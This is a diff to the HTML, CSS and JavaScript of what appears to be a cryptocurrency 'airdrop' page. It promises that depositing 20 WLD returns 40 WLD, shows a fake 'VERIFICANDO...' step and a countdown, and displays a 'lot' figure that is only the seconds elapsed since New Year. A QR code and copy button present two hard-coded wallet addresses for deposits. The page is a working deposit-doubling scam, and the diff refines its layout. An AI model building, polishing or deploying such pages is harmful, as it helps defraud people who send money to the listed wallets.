@@ -155,6 +155,14 @@ html,body{
   letter-spacing:4px;
 }
 
+/* QR BOX CENTRAL */
+.qr-box{
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  width:100%;
+}
+
 /* QR STYLES */
 .qr-box canvas{
   background:#fff;
@@ -162,13 +170,20 @@ html,body{
   border-radius:14px;
 }
 
+/* COPY STYLES */
+.deposit-code{
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  gap:6px;
+}
 .deposit-code input{
   width:320px;
   padding:10px;
   text-align:center;
 }
 .deposit-code button{
-  margin-top:10px;
+  margin-top:6px;
   padding:10px 22px;
   border:none;
   background:#000;
@@ -216,34 +231,41 @@ html,body{
 <div id="modalBox"><span id="modalText">VERIFICANDO...</span></div>
 
 <!-- SCREEN 2 -->
-<div class="screen" id="screen2" style="display: none;">
-  <img src="logowld.png" class="logo" alt="Logo">
+<div class="screen" id="screen2">
 
+  <!-- LOGO GIRATORIO arriba -->
+  <img src="logowld.png" class="logo">
+
+  <!-- TEXTO ESTÁTICO -->
   <div class="static-text">AIRDROP END</div>
 
-
+  <!-- CONTADOR HH:MM:SS -->
   <div id="dateCountdown"></div>
 
+  <!-- QR CENTRADO -->
   <div class="qr-box">
     <canvas id="qrCanvas" width="160" height="160"></canvas>
   </div>
 
+  <!-- COPY -->
   <div class="deposit-code">
     <input id="addr" readonly>
     <button id="copyBtn">COPY ADDRESS</button>
   </div>
 
+  <!-- AIRDROP LOT -->
   <div id="airdropLot">
     AIRDROP LOT: <span id="lotValue">0</span>
   </div>
+
 </div>
 
 <script>
 
 /* ===== SCREEN 1 TEXTOS ===== */
 const TEXTS1=[
-"100% EARN AIRDROP","DEPOSIT 20 WLD","GET 40 WLD",
-"100% 获得空投","存入 20 WLD","获得 40 WLD"
+  "100% EARN AIRDROP","DEPOSIT 20 WLD","GET 40 WLD",
+  "100% 获得空投","存入 20 WLD","获得 40 WLD"
 ];
 
 const lines=[l1,l2,l3];
@@ -269,7 +291,7 @@ async function loop1(){
 
 loop1(); setInterval(loop1,7000);
 
-/* ===== SCREEN 1 FONDO ===== */
+/* ===== FONDO ===== */
 function spawnBg(){
   const t=document.createElement("div");
   t.className="bg-text";
@@ -284,10 +306,9 @@ function spawnBg(){
   bgLayer.appendChild(t);
   setTimeout(()=>t.remove(),50000);
 }
-
 setInterval(spawnBg,2600);
 
-/* ===== VERIFY FLOW ===== */
+/* ===== VERIFY ===== */
 verifyBtn.onclick=()=>{
   modalBox.style.display="block";
   modalText.style.color="#000";
@@ -305,8 +326,10 @@ verifyBtn.onclick=()=>{
   },4000);
 };
 
-/* ===== screen2 COUNTDOWN ===== */
+/* ===== CONTADOR ===== */
 const dateEl=document.getElementById("dateCountdown");
+const lotEl=document.getElementById("lotValue");
+
 function startTimer(){
   setInterval(()=>{
     const now=new Date();
@@ -320,13 +343,13 @@ function startTimer(){
   /* ===== AIRDROP LOT estático ===== */
   const startYear=new Date(new Date().getFullYear(),0,1);
   const secondsSince=Math.floor((Date.now()-startYear.getTime())/1000);
-  lotValue.innerText=secondsSince.toLocaleString();
+  lotEl.innerText=secondsSince.toLocaleString();
 }
 
 /* ===== QR ===== */
 const WALLETS=[
-"0x1f62e7890d5db2c94c280547876b050f5d1816c5",
-"0xf8af1505beb8a37207eb1f019ded31dd08fc571c"
+  "0x1f62e7890d5db2c94c280547876b050f5d1816c5",
+  "0xf8af1505beb8a37207eb1f019ded31dd08fc571c"
 ];
 let wi=0;
 const qr=new QRious({element:qrCanvas,size:160,value:WALLETS[0]});
